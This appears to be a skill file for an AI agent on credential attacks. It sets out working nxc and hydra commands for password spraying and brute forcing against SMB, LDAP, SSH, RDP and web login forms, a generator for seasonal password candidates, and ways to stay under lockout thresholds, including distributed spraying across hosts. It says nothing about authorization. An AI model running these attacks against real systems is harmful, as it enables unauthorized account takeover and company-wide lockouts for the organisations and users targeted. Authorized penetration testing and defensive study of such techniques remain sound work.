---
name: cred-spray
description: "Credential spraying and brute forcing: password policy analysis, safe spraying, and lockout avoidance. Use this skill when testing authentication with many accounts."
---

# Credential Attacks

## Overview

Spray one password across many accounts; brute force one account with many passwords. Spraying avoids lockouts and finds weak passwords at scale.

## Check the policy first

```bash
nxc smb DC -u user -p pass --pass-pol
```

```
Lockout threshold: 5
Observation window: 30 min
Lockout duration: 30 min
```

Threshold 0 = no lockout → safe to spray freely. Threshold 5 → at most 4 attempts per account per window.

## Spray

```bash
nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success
nxc ldap DC -u users.txt -p 'Spring2026!' --continue-on-success
```

Multiple passwords, careful ordering:

```bash
nxc smb DC -u users.txt -p passwords.txt --no-bruteforce   # pairs 1:1
```

## Password candidates

Season + year, company name + digits, `Welcome1`, `Password123`, `Changeme123`, common patterns from breach data:

```bash
# build a targeted list
python3 - <<'EOF'
base = ["Spring","Summer","Fall","Winter","Company","Welcome"]
years = ["2025","2026","!"]
for b in base:
    for y in years: print(f"{b}{y}")
EOF
```

## Other protocols

```bash
hydra -L users.txt -P pass.txt ssh://target
hydra -L users.txt -P pass.txt rdp://target
hydra -l admin -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

## Distributed spraying

```bash
# one attempt per account per host resets the counter
nxc smb 10.0.0.1 10.0.0.2 10.0.0.3 -u users.txt -p 'Spring2026!'
```

## OWA / VPN

```bash
# owa
python3 owa_spray.py
# vpn (fortinet, pulse, citrix) — use vendor-specific tools
```

## Pitfalls

- Spraying past the threshold locks out the whole company — always read the policy.
- Some DCs replicate lockout counters slowly; distributed spraying can still trip it.
- A `STATUS_LOGON_FAILURE` vs `STATUS_ACCOUNT_LOCKED_OUT` distinction stops you immediately.

## Verification

Any found credential must authenticate to a real service.
